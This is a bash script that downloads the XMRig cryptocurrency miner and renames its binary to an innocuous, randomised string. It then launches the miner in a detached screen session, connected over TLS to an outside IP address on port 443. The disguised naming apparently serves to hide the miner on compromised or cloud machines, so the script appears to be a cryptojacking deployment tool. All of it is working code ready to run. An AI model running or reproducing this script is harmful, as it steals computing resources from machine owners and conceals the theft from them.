#!/bin/bash
apt-get update &&
VERSION=6.21.0 &&
azure=mxsemsdnlkdj &&
a='mxsemsdnlkdj-' &&
b=$(shuf -i10-375 -n1) &&
c='-' &&
d=$(shuf -i10-259 -n1) &&
cpuname=$a$b$c$d &&
apt-get install -y git wget screen &&
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz &&
tar -xvzf xmrig-$VERSION-linux-x64.tar.gz &&
rm -rf xmrig-$VERSION-linux-x64.tar.gz &&
cd xmrig-$VERSION &&
mv xmrig $azure -n &&
cp $azure "$cpuname" &&
rm -f xmrig &&
POOL=88.99.74.228:443 &&
DONATE=1 &&
echo $cpuname" is starting" &&
screen ./$azure -o 168.119.85.190:443 --tls -t 8
